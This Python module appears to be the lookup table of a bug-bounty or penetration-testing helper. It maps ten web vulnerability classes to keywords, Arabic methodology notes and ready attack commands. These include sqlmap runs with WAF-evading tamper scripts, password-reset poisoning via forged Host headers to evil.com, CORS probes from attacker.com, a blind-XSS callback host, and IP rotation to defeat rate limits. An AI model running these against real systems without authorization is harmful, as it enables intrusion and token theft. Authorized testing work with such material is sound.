# modules/web_handlers.py

WEB_MATRIX = {
    "vun_xss": {
        "keywords": ["xss", "cross-site scripting", "<script>", "alert(", "onload=", "searchquery", "q="],
        "title": "🎯 Vulnerability: Cross-Site Scripting (XSS) & CSP Bypass",
        "severity": "Medium to High",
        "methodology": "• افحص سياق الحقن (HTML, Attribute, or JS Context).\n• إذا كان هناك CSP (Content Security Policy)، اختبر التخطي عبر ثغرات الـ JSONP في النطاقات الموثوقة أو عبر وسم `<link rel=import>`.\n• لتجاوز الـ Input Filter، استخدم الـ HTML Entity Encoding أو أداة `dalfox` للأتمتة الذكية.",
        "command": "dalfox url [TARGET] -b https://yourblindxss.xss.ht"
    },
    "vun_csrf": {
        "keywords": ["csrf", "xsrf", "cross-site request forgery", "anti-csrf", "csrf-token"],
        "title": "🛡️ Vulnerability: Cross-Site Request Forgery (CSRF)",
        "severity": "Medium to High",
        "methodology": "• ابحث عن طلبات تغيير البيانات الحساسة. اختبر إزالة ترويسة الـ Token تماماً.\n• جرب التلاعب بقيمة الترويسة وتغيير نوع الطلب من POST إلى GET.\n• افحص لو كان الـ SameSite Cookie مفعلاً على وضعية Lax أو None لأنها منطلق الاختراق الميداني.",
        "command": "🎯 تكتيك: قم بتوليد نموذج PoC عبر Burp واختبر التنفيذ في بيئة معزولة."
    },
    "vun_host_header": {
        "keywords": ["host header", "x-forwarded-host", "host injection", "password reset poison"],
        "title": "🌐 Vulnerability: Host Header Injection",
        "severity": "Low to High",
        "methodology": "• تلاعب بقيمة `Host: evil.com` وتفقد التحويلات.\n• احقن الترويسات الرديفة: `X-Forwarded-Host`, `X-Forwarded-Server`, `X-Host`.\n• اختبر ثغرات تسميم رابط استعادة كلمة المرور (Password Reset Poisoning) لسرقة توكن الضحية.",
        "command": "curl -H \"Host: target.com\" -H \"X-Forwarded-Host: evil.com\" [TARGET]"
    },
    "vun_open_redirect": {
        "keywords": ["open redirect", "redirect=", "url=", "next=", "return=", "dest="],
        "title": "🔗 Vulnerability: Open Redirect",
        "severity": "Medium",
        "methodology": "• ابحث عن بارامترات التحويل المفتوحة بعد العمليات الشرطية.\n• اختبر التجاوز للفلاتر باستخدام الـ Slashes المزدوجة `///evil.com` أو الـ URL-encoding للتحويل الملتوي.\n• ادمجها مع ثغرات OAuth لسرقة الـ Authorization Codes تكتيكياً.",
        "command": "gau [TARGET] | grep -E '(redirect|url|next|return|dest)=' | qsreplace 'https://evil.com'"
    },
    "vun_idor": {
        "keywords": ["idor", "bola", "broken object level authorization", "/api/v", "id="],
        "title": "🆔 Vulnerability: Insecure Direct Object Reference (IDOR)",
        "severity": "High to Critical",
        "methodology": "• اختبر التلاعب بالمعرفات الرقمية والنصية في مسارات الـ API.\n• جرب تخطي حظر الصلاحيات عن طريق تزويد الطلب بترويسات مخصصة مثل `X-Original-URL` أو `X-Rewrite-URL` لتضليل الـ WAF والـ API Gateway.\n• اختبر تبديل المعرف بـ Array أو حزمة JSON الجاهزة لكسر الـ Business Logic الخلفي.",
        "command": "🎯 تكتيك: استخدم موديول Autorize في Burp Suite مع حسابين بصلاحيات مختلفة لأتمتة الصيد."
    },
    "vun_graphql": {
        "keywords": ["graphql", "/graphql", "query {", "mutation", "introspection"],
        "title": "📊 Vulnerability: GraphQL API Exploitation",
        "severity": "Low to High",
        "methodology": "• افحص حالة الـ Introspection لاستخراج خريطة الـ Schema كاملة.\n• ابحث عن ثغرات الـ Field Suggestions إذا كانت الـ Introspection مغلقة.\n• اختبر تنفيذ Batching Attack لإرسال آلاف طلبات التخمين في حزمة واحدة لتخطي الـ Rate Limiting الحامي.",
        "command": "graphql-cop -u [TARGET]/graphql"
    },
    "vun_sqli": {
        "keywords": ["sqli", "sql injection", "union select", "select ", "order by", "database error"],
        "title": "🛢️ Vulnerability: SQL Injection (SQLi) & WAF Bypass",
        "severity": "High to Critical",
        "methodology": "• احقن الأنماط لكسر الاستعلامات. لتجاوز فلاتر الـ WAF (مثل Cloudflare أو Imperva)، استخدم الـ Inline Comments البرمجية مثل `/*!50000Select*/` أو التشفير الثنائي المتطور.\n• افحص إمكانية الـ Time-Based Blind SQLi في حقول الـ User-Agent والترويسات الجانبية.",
        "command": "sqlmap -u '[URL]' --batch --tamper=space2comment,charencode --level=5 --risk=3"
    },
    "vun_cors": {
        "keywords": ["cors", "cross-origin", "origin:", "access-control-allow-origin", "null origin"],
        "title": "🌐 Vulnerability: CORS Misconfiguration",
        "severity": "Medium to High",
        "methodology": "• أرسل `Origin: https://evil.com` وراقب الاستجابة الحية.\n• إذا ظهرت الترويسة `Access-Control-Allow-Credentials: true` بشكل ديناميكي، فهذا تسريب كامل.\n• اختبر الخداع بالنطاقات الفرعية العشوائية مثل `Origin: https://sub.target.com.evil.com`.",
        "command": "curl -H \"Origin: https://attacker.com\" -I [TARGET]"
    },
    "vun_ssti": {
        "keywords": ["ssti", "server-side template injection", "${{", "{{", "erb", "jinja2", "thymeleaf"],
        "title": "🎨 Vulnerability: Server-Side Template Injection (SSTI)",
        "severity": "High to Critical (RCE)",
        "methodology": "• احقن عمليات حسابية متفردة للتأكد من المعالجة الخلفية (`{{7*7}}`).\n• حدد المحرك المستعمل (Jinja, Twig, Mako) بناءً على مخرجات الأخطاء المرتجعة.\n• تتبع السلسلة المنهجية (MRO Chain) للوصول لكلاسات نظام التشغيل لتنفيذ أمر RCE كامل وتخطي الـ Input Filter.",
        "command": "tplmap -u '[URL]'"
    },
    "vun_rate_limit": {
        "keywords": ["rate limit", "too many requests", "429", "captcha", "brute force"],
        "title": "⏱️ Security Bypass: Rate Limiting & Captcha Defeat",
        "severity": "Medium",
        "methodology": "• اختبر تخطي جدران حماية تحديد معدل الطلبات (Rate Limiting) عبر حقن ترويسات الخداع المكاني مثل `X-Forwarded-For: 127.0.0.1` أو تغييرها بشكل عشوائي مع كل طلب.\n• جرب تبديل أحرف الـ API (مثل تغيير الحروف الكبيرة/الصغيرة) أو إضافة مسارات مهملة بالعمق مثل `/api/v1/login/..;/login` لتضليل الحماية.",
        "command": "🎯 تكتيك: استخدم إضافة IP Rotate في Burp Suite لتغيير الـ IP الخارجي عبر سحابة AWS مع كل نقرة هجومية."
    }
}
